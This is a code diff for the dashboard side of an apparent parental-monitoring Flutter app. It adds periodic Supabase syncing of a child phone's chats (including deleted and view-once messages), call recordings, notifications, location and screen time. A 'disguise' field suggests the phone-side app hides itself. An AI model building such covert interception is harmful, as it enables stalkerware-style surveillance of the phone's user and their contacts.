@@ -20,6 +20,7 @@ class ParentDashboardProvider extends ChangeNotifier {
     _loadLocalPersistence();
     _initFirebaseListeners();
     _startLanDiscovery();
+    _startSupabaseSync();
   }
 
   final LanSyncService _lanSync = LanSyncService();
@@ -37,7 +38,11 @@ class ParentDashboardProvider extends ChangeNotifier {
   bool _isLanSyncing = false;
   bool get isLanSyncing => _isLanSyncing;
 
+  bool _isSupabaseSyncing = false;
+  bool get isSupabaseSyncing => _isSupabaseSyncing;
+
   Timer? _lanDiscoveryTimer;
+  Timer? _supabaseSyncTimer;
   StreamSubscription<Map<String, dynamic>>? _lanLiveStreamSub;
 
   FirebaseFirestore? _firestore;
@@ -177,6 +182,7 @@ class ParentDashboardProvider extends ChangeNotifier {
           }
 
           _initFirebaseListeners();
+          syncFromSupabase();
           notifyListeners();
         }
       }
@@ -525,13 +531,240 @@ class ParentDashboardProvider extends ChangeNotifier {
     }
   }
 
-  /// Supabase Cloud Sync
+  void _startSupabaseSync() {
+    try {
+      if (Platform.environment.containsKey('FLUTTER_TEST')) return;
+    } catch (_) {}
+    _supabaseSyncTimer?.cancel();
+    _supabaseSyncTimer = Timer.periodic(const Duration(seconds: 15), (_) {
+      syncFromSupabase();
+    });
+    // First trigger after 1.5 seconds
+    Future.delayed(const Duration(milliseconds: 1500), () => syncFromSupabase());
+  }
+
+  Future<void> refreshAll() async {
+    await Future.wait([
+      syncFromSupabase(),
+      triggerLanSync(),
+    ]);
+  }
+
+  /// Supabase Cloud Sync: Fetches devices, chats, calls, notifications, and screen time
+  /// from Supabase PostgreSQL tables and seamlessly merges them into local memory and disk persistence cache.
   Future<void> syncFromSupabase() async {
     if (!_supabaseSync.isConfigured) return;
+    if (_isSupabaseSyncing) return;
+    _isSupabaseSyncing = true;
+    notifyListeners();
+
+    final targetCode = activePairingCode.isNotEmpty ? activePairingCode : _activeChildId;
+
     try {
-      await _supabaseSync.fetchTable("chats", filterField: "id");
+      // 1. Fetch Devices & Telemetry
+      final devices = await _supabaseSync.fetchTable("devices");
+      if (devices.isNotEmpty) {
+        for (final d in devices) {
+          final devId = d['id']?.toString() ?? '';
+          if (devId.isEmpty) continue;
+
+          final idx = _children.indexWhere((c) => c.id == devId || c.pairingCode == devId);
+          if (idx != -1) {
+            _children[idx] = ChildProfile(
+              id: _children[idx].id,
+              pairingCode: _children[idx].pairingCode,
+              name: (_children[idx].name.isEmpty || _children[idx].name == 'No Device')
+                  ? (d['device_model'] ?? 'Vivo V2404')
+                  : _children[idx].name,
+              deviceModel: d['device_model']?.toString() ?? _children[idx].deviceModel,
+              batteryLevel: (d['battery_level'] as num?)?.toInt() ?? _children[idx].batteryLevel,
+              isOnline: (d['is_online'] as bool?) ?? _children[idx].isOnline,
+              locationAddress: d['location_address']?.toString() ?? _children[idx].locationAddress,
+              selectedDisguise: d['selected_disguise']?.toString() ?? _children[idx].selectedDisguise,
+              isScreenOn: (d['is_screen_on'] as bool?) ?? _children[idx].isScreenOn,
+            );
+          } else {
+            _children.add(ChildProfile(
+              id: devId,
+              pairingCode: devId,
+              name: d['device_model']?.toString() ?? 'Child Device',
+              deviceModel: d['device_model']?.toString() ?? 'Android Phone',
+              batteryLevel: (d['battery_level'] as num?)?.toInt() ?? 100,
+              isOnline: (d['is_online'] as bool?) ?? true,
+              locationAddress: d['location_address']?.toString() ?? '',
+              selectedDisguise: d['selected_disguise']?.toString() ?? 'System Toolkit',
+              isScreenOn: (d['is_screen_on'] as bool?) ?? false,
+            ));
+          }
+        }
+      }
+
+      // 2. Fetch Chats
+      final chatsData = await _supabaseSync.fetchTable(
+        "chats",
+        filterField: "child_id",
+        filterValue: targetCode,
+        order: "timestamp_ms.desc",
+        limit: 500,
+      );
+      if (chatsData.isNotEmpty) {
+        final newMsgs = <ChatMessage>[];
+        for (final m in chatsData) {
+          final id = m['id']?.toString() ?? '';
+          if (id.isEmpty) continue;
+          final appStr = (m['app'] ?? '').toString().toLowerCase();
+          AppType app = AppType.whatsApp;
+          if (appStr.contains('insta')) app = AppType.instagram;
+          if (appStr.contains('tele')) app = AppType.telegram;
+          if (appStr.contains('snap')) app = AppType.snapchat;
+          if (appStr.contains('sms') || appStr.contains('mms')) app = AppType.sms;
+
+          final dt = m['timestamp_ms'] != null
+              ? DateTime.fromMillisecondsSinceEpoch((m['timestamp_ms'] as num).toInt())
+              : DateTime.now();
+
+          newMsgs.add(ChatMessage(
+            id: id,
+            appType: app,
+            contactName: m['sender']?.toString() ?? 'Unknown',
+            contactIdentifier: m['sender']?.toString() ?? '',
+            messageText: m['text']?.toString() ?? '',
+            timestamp: dt,
+            isIncoming: (m['is_incoming'] as bool?) ?? true,
+            isDeletedBackup: (m['is_deleted_by_sender'] as bool?) ?? false,
+            isWatchlistTarget: (m['is_watchlist_target'] as bool?) ?? false,
+            mediaUrl: m['media_url']?.toString(),
+            mediaType: m['media_type']?.toString(),
+            isViewOnce: (m['is_view_once'] as bool?) ?? false,
+          ));
+        }
+
+        _childChatMessages.putIfAbsent(_activeChildId, () => []);
+        final existingIds = _childChatMessages[_activeChildId]!.map((e) => e.id).toSet();
+        for (final msg in newMsgs) {
+          if (!existingIds.contains(msg.id)) {
+            _childChatMessages[_activeChildId]!.add(msg);
+          }
+        }
+        _childChatMessages[_activeChildId]!.sort((a, b) => b.timestamp.compareTo(a.timestamp));
+        _mergeNotificationsIntoActiveChats();
+      }
+
+      // 3. Fetch Calls
+      final callsData = await _supabaseSync.fetchTable(
+        "calls",
+        filterField: "child_id",
+        filterValue: targetCode,
+        order: "timestamp_ms.desc",
+        limit: 200,
+      );
+      if (callsData.isNotEmpty) {
+        final newCalls = <CallRecord>[];
+        for (final c in callsData) {
+          final id = c['id']?.toString() ?? '';
+          if (id.isEmpty) continue;
+          final dt = c['timestamp_ms'] != null
+              ? DateTime.fromMillisecondsSinceEpoch((c['timestamp_ms'] as num).toInt())
+              : DateTime.now();
+
+          final typeStr = (c['call_type'] ?? 'incoming').toString().toLowerCase();
+          CallType cType = CallType.incoming;
+          if (typeStr.contains('out')) cType = CallType.outgoing;
+          if (typeStr.contains('miss')) cType = CallType.missed;
+
+          newCalls.add(CallRecord(
+            id: id,
+            contactName: c['contact_name']?.toString() ?? 'Unknown',
+            phoneNumber: c['phone_number']?.toString() ?? '',
+            callType: cType,
+            timestamp: dt,
+            durationSeconds: (c['duration_seconds'] as num?)?.toInt() ?? 0,
+            recordingUrl: c['recording_url']?.toString(),
+            recordingDurationSeconds: (c['recording_duration_seconds'] as num?)?.toInt(),
+            isTamperAttemptDetected: (c['is_tamper_attempt_detected'] as bool?) ?? false,
+            isWatchlistTarget: (c['is_watchlist_target'] as bool?) ?? false,
+          ));
+        }
+
+        _childCallRecords.putIfAbsent(_activeChildId, () => []);
+        final existingCallIds = _childCallRecords[_activeChildId]!.map((e) => e.id).toSet();
+        for (final call in newCalls) {
+          if (!existingCallIds.contains(call.id)) {
+            _childCallRecords[_activeChildId]!.add(call);
+          }
+        }
+        _childCallRecords[_activeChildId]!.sort((a, b) => b.timestamp.compareTo(a.timestamp));
+      }
+
+      // 4. Fetch Notifications
+      final notifsData = await _supabaseSync.fetchTable(
+        "notifications",
+        filterField: "child_id",
+        filterValue: targetCode,
+        order: "timestamp_ms.desc",
+        limit: 300,
+      );
+      if (notifsData.isNotEmpty) {
+        final newNotifs = <NotificationItem>[];
+        for (final n in notifsData) {
+          final id = n['id']?.toString() ?? '';
+          if (id.isEmpty) continue;
+          final dt = n['timestamp_ms'] != null
+              ? DateTime.fromMillisecondsSinceEpoch((n['timestamp_ms'] as num).toInt())
+              : DateTime.now();
+
+          newNotifs.add(NotificationItem(
+            id: id,
+            packageName: n['package_name']?.toString() ?? '',
+            appName: n['app_name']?.toString() ?? 'App',
+            title: n['title']?.toString() ?? '',
+            message: n['text']?.toString() ?? '',
+            timestamp: dt,
+            isSensitiveAlert: (n['is_important'] as bool?) ?? false,
+          ));
+        }
+
+        _childNotifications.putIfAbsent(_activeChildId, () => []);
+        final existingNotifIds = _childNotifications[_activeChildId]!.map((e) => e.id).toSet();
+        for (final notif in newNotifs) {
+          if (!existingNotifIds.contains(notif.id)) {
+            _childNotifications[_activeChildId]!.add(notif);
+          }
+        }
+        _childNotifications[_activeChildId]!.sort((a, b) => b.timestamp.compareTo(a.timestamp));
+      }
+
+      // 5. Fetch Screen Time
+      final screenTimeData = await _supabaseSync.fetchTable(
+        "screen_time",
+        filterField: "child_id",
+        filterValue: targetCode,
+        order: "timestamp_ms.desc",
+        limit: 1,
+      );
+      if (screenTimeData.isNotEmpty) {
+        final st = screenTimeData.first;
+        _todayScreenTimeMinutes = (st['total_screen_time_minutes'] as num?)?.toInt() ?? 0;
+        final rawApps = st['apps'];
+        if (rawApps is List) {
+          _todayAppUsages = rawApps.map((a) {
+            final m = a as Map<String, dynamic>;
+            return {
+              'appName': m['appName']?.toString() ?? 'App',
+              'packageName': m['packageName']?.toString() ?? '',
+              'minutes': (m['minutes'] as num?)?.toInt() ?? 0,
+              'lastUsed': (m['lastUsed'] as num?)?.toInt() ?? 0,
+            };
+          }).toList();
+        }
+      }
+
+      _saveLocalPersistence();
     } catch (e) {
       debugPrint("syncFromSupabase error: $e");
+    } finally {
+      _isSupabaseSyncing = false;
+      notifyListeners();
     }
   }
 
@@ -552,6 +785,7 @@ class ParentDashboardProvider extends ChangeNotifier {
     _activeChildId = childId;
     _saveLocalPersistence();
     _initFirebaseListeners();
+    syncFromSupabase();
     notifyListeners();
   }
 
@@ -1724,10 +1958,13 @@ class ParentDashboardProvider extends ChangeNotifier {
   void dispose() {
     _lanLiveStreamSub?.cancel();
     _lanDiscoveryTimer?.cancel();
+    _supabaseSyncTimer?.cancel();
     _deviceSub?.cancel();
+    _devicesDiscoverySub?.cancel();
     _callsSub?.cancel();
     _chatsSub?.cancel();
     _notifsSub?.cancel();
+    _screenTimeSub?.cancel();
     super.dispose();
   }
 }
